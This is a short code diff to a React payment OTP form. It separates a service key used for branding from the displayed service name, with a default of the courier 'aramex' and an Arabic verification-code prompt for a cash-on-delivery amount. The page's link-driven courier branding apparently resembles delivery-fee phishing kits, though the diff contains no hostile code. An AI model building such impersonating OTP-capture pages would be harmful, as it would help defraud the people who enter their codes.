@@ -21,8 +21,9 @@ const PaymentOTPForm = () => {
   const [countdown, setCountdown] = useState(60);
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const serviceName = linkData?.payload?.service_name || customerInfo.service || 'aramex';
-  const branding = getServiceBranding(serviceName);
+  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const branding = getServiceBranding(serviceKey);
   
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
@@ -118,6 +119,7 @@ const PaymentOTPForm = () => {
   return (
     <DynamicPaymentLayout
       serviceName={serviceName}
+      serviceKey={serviceKey}
       amount={formattedAmount}
       title="رمز التحقق"
       description={`أدخل رمز التحقق لخدمة ${serviceName}`}
